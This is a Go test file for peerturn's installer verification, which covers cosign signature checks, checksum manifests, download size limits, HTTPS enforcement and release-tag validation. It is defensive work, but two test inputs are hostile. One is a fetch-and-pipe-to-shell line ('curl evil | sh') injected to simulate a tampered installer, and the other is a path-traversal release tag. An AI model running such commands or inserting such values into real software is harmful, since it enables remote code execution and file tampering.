package update_test

import (
	"crypto/sha256"
	"encoding/hex"
	"errors"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"testing"

	"github.com/temirlankasen/peerturn/internal/update"
)

const (
	testTag     = "v0.2.0-preview"
	testVersion = "0.2.0-preview"
	installBody = "#!/bin/sh\necho installing\n"
)

// writeExecutable creates a private script; the stub stands in for the real cosign.
func writeExecutable(t *testing.T, dir, name, body string) string {
	t.Helper()
	root, err := os.OpenRoot(dir)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() {
		if closeErr := root.Close(); closeErr != nil {
			t.Error(closeErr)
		}
	})
	file, err := root.OpenFile(name, os.O_CREATE|os.O_EXCL|os.O_WRONLY, 0o700)
	if err != nil {
		t.Fatal(err)
	}
	if _, err = io.WriteString(file, body); err != nil {
		t.Fatal(err)
	}
	if err = file.Close(); err != nil {
		t.Fatal(err)
	}
	return filepath.Join(dir, name)
}

// readTestFile reads through a root handle, like the production code does.
func readTestFile(path string) ([]byte, error) {
	root, err := os.OpenRoot(filepath.Dir(path))
	if err != nil {
		return nil, err
	}
	data, readErr := root.ReadFile(filepath.Base(path))
	return data, errors.Join(readErr, root.Close())
}

// stubCosign logs every call and answers like cosign with the given version and verify exit status.
func stubCosign(t *testing.T, gitVersion string, verifyExit int, verifyStderr string) (path, log string) {
	t.Helper()
	dir := t.TempDir()
	log = filepath.Join(dir, "calls.log")
	script := "#!/bin/sh\necho \"$@\" >> '" + log + "'\n" +
		"case \"$1\" in\n" +
		"  version) printf '{\"gitVersion\":\"" + gitVersion + "\"}\\n' ;;\n" +
		"  verify-blob) printf '%s' '" + verifyStderr + "' >&2; exit " + strconv.Itoa(verifyExit) + " ;;\n" +
		"esac\n"
	return writeExecutable(t, dir, "cosign", script), log
}

type releaseFiles map[string]string

func goodFiles(script string) releaseFiles {
	sum := sha256.Sum256([]byte(script))
	manifest := hashB + "  install.ps1\n" + hex.EncodeToString(sum[:]) + "  install.sh\n"
	return releaseFiles{
		"install.sh":                                         script,
		"peerturn_0.2.0-preview_checksums.txt":               manifest,
		"peerturn_0.2.0-preview_checksums.txt.sigstore.json": `{"bundle":true}`,
	}
}

// requestLog records what the fake release server was asked for, safely across goroutines.
type requestLog struct {
	mu    sync.Mutex
	paths []string
}

func (l *requestLog) add(path string) {
	l.mu.Lock()
	defer l.mu.Unlock()
	l.paths = append(l.paths, path)
}

func (l *requestLog) list() []string {
	l.mu.Lock()
	defer l.mu.Unlock()
	return append([]string{}, l.paths...)
}

func releaseOptions(t *testing.T, files releaseFiles, cosign string) (update.Options, *requestLog) {
	t.Helper()
	requested := &requestLog{}
	server := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		requested.add(r.URL.Path)
		name, found := strings.CutPrefix(r.URL.Path, "/dl/"+testTag+"/")
		body, exists := files[name]
		if !found || !exists {
			http.NotFound(w, r)
			return
		}
		if _, err := io.WriteString(w, body); err != nil {
			return // the client hung up; its own assertions report the outcome
		}
	}))
	t.Cleanup(server.Close)
	return update.Options{
		Client:       server.Client(),
		DownloadBase: server.URL + "/dl",
		Release:      update.Release{Tag: testTag, Version: testVersion},
		Dir:          t.TempDir(),
		LookPath: func(name string) (string, error) {
			if name != "cosign" || cosign == "" {
				return "", errors.New("not found")
			}
			return cosign, nil
		},
	}, requested
}

func TestVerifyInstallerReturnsVerifiedScript(t *testing.T) {
	t.Parallel()
	cosign, log := stubCosign(t, "v3.1.3", 0, "")
	opts, _ := releaseOptions(t, goodFiles(installBody), cosign)
	script, err := update.VerifyInstaller(t.Context(), opts)
	if err != nil {
		t.Fatal(err)
	}
	if script != filepath.Join(opts.Dir, "install.sh") {
		t.Fatalf("script = %q", script)
	}
	if data, readErr := readTestFile(script); readErr != nil || string(data) != installBody {
		t.Fatalf("script content = %q, %v", data, readErr)
	}
	calls, err := readTestFile(log)
	if err != nil {
		t.Fatal(err)
	}
	manifest := filepath.Join(opts.Dir, "peerturn_0.2.0-preview_checksums.txt")
	want := "verify-blob --bundle " + manifest + ".sigstore.json" +
		" --certificate-identity https://github.com/temirlankasen/peerturn/.github/workflows/release.yml@refs/tags/" + testTag +
		" --certificate-oidc-issuer https://token.actions.githubusercontent.com " + manifest
	if !strings.Contains(string(calls), "version --json\n") || !strings.Contains(string(calls), want+"\n") {
		t.Fatalf("cosign calls:\n%s\nwant a version probe and\n%s", calls, want)
	}
}

func TestVerifyInstallerAcceptsNewerCosign(t *testing.T) {
	t.Parallel()
	for _, gitVersion := range []string{"v3.1.3", "v3.2.0", "v4.0.0", "v3.10.1"} {
		cosign, _ := stubCosign(t, gitVersion, 0, "")
		opts, _ := releaseOptions(t, goodFiles(installBody), cosign)
		if _, err := update.VerifyInstaller(t.Context(), opts); err != nil {
			t.Errorf("cosign %s: %v", gitVersion, err)
		}
	}
}

func TestVerifyInstallerRequiresRecentCosignBeforeDownloading(t *testing.T) {
	t.Parallel()
	missing, _ := releaseOptions(t, goodFiles(installBody), "")
	_, err := update.VerifyInstaller(t.Context(), missing)
	if err == nil || err.Error() != "cosign is not installed; install cosign ≥ 3.1.3 (brew install cosign) and rerun peerturn upgrade" {
		t.Errorf("missing cosign error = %v", err)
	}
	for _, gitVersion := range []string{"v3.1.2", "v2.9.9", "v3.0.9", "dev", ""} {
		cosign, _ := stubCosign(t, gitVersion, 0, "")
		opts, requested := releaseOptions(t, goodFiles(installBody), cosign)
		_, err = update.VerifyInstaller(t.Context(), opts)
		if err == nil || !strings.Contains(err.Error(), "install cosign ≥ 3.1.3") || len(requested.list()) != 0 {
			t.Errorf("cosign %q: err = %v after downloads %v", gitVersion, err, requested.list())
		}
	}
}

func TestVerifyInstallerStopsOnSignatureFailure(t *testing.T) {
	t.Parallel()
	cosign, _ := stubCosign(t, "v3.1.3", 1, "Error: none of the expected identities matched\n")
	opts, _ := releaseOptions(t, goodFiles(installBody), cosign)
	_, err := update.VerifyInstaller(t.Context(), opts)
	if err == nil || !strings.Contains(err.Error(), "signature") || !strings.Contains(err.Error(), "none of the expected identities matched") {
		t.Fatalf("err = %v, want the signature failure with cosign's reason", err)
	}
}

func TestVerifyInstallerRejectsTamperedScript(t *testing.T) {
	t.Parallel()
	cosign, _ := stubCosign(t, "v3.1.3", 0, "")
	files := goodFiles(installBody)
	files["install.sh"] = installBody + "curl evil | sh\n"
	opts, _ := releaseOptions(t, files, cosign)
	if _, err := update.VerifyInstaller(t.Context(), opts); err == nil || !strings.Contains(err.Error(), "install.sh") {
		t.Fatalf("err = %v, want a checksum mismatch for install.sh", err)
	}
}

func TestVerifyInstallerRejectsBadManifests(t *testing.T) {
	t.Parallel()
	sum := sha256.Sum256([]byte(installBody))
	entry := hex.EncodeToString(sum[:]) + "  install.sh\n"
	for name, manifest := range map[string]string{
		"missing entry":    hashB + "  install.ps1\n",
		"duplicate entry":  entry + entry,
		"invalid line":     entry + "oops\n",
		"empty manifest":   "",
		"CRLF line ending": strings.TrimSuffix(entry, "\n") + "\r\n",
	} {
		t.Run(name, func(t *testing.T) {
			t.Parallel()
			cosign, _ := stubCosign(t, "v3.1.3", 0, "")
			files := goodFiles(installBody)
			files["peerturn_0.2.0-preview_checksums.txt"] = manifest
			opts, _ := releaseOptions(t, files, cosign)
			if _, err := update.VerifyInstaller(t.Context(), opts); err == nil {
				t.Fatal("a manifest that does not list install.sh exactly once was accepted")
			}
		})
	}
}

func TestVerifyInstallerBoundsDownloads(t *testing.T) {
	t.Parallel()
	cosign, _ := stubCosign(t, "v3.1.3", 0, "")
	files := goodFiles(installBody)
	files["peerturn_0.2.0-preview_checksums.txt.sigstore.json"] = strings.Repeat("x", 1<<20+1)
	opts, _ := releaseOptions(t, files, cosign)
	if _, err := update.VerifyInstaller(t.Context(), opts); err == nil || !strings.Contains(err.Error(), "too large") {
		t.Fatalf("err = %v, want a size refusal", err)
	}
}

func TestVerifyInstallerReportsMissingAsset(t *testing.T) {
	t.Parallel()
	cosign, _ := stubCosign(t, "v3.1.3", 0, "")
	files := goodFiles(installBody)
	delete(files, "install.sh")
	opts, _ := releaseOptions(t, files, cosign)
	if _, err := update.VerifyInstaller(t.Context(), opts); err == nil || !strings.Contains(err.Error(), "install.sh") {
		t.Fatalf("err = %v, want the missing asset named", err)
	}
}

func TestVerifyInstallerRefusesPlainHTTPAndBadRelease(t *testing.T) {
	t.Parallel()
	cosign, _ := stubCosign(t, "v3.1.3", 0, "")
	opts, requested := releaseOptions(t, goodFiles(installBody), cosign)
	plain := opts
	plain.DownloadBase = strings.Replace(opts.DownloadBase, "https://", "http://", 1)
	if _, err := update.VerifyInstaller(t.Context(), plain); err == nil {
		t.Error("a plain HTTP download base was accepted")
	}
	bad := opts
	bad.Release = update.Release{Tag: "v0.2.0/../../x", Version: "0.2.0/../../x"}
	if _, err := update.VerifyInstaller(t.Context(), bad); err == nil {
		t.Error("an unsafe release tag was accepted")
	}
	if len(requested.list()) != 0 {
		t.Errorf("requests were made before validation: %v", requested.list())
	}
}
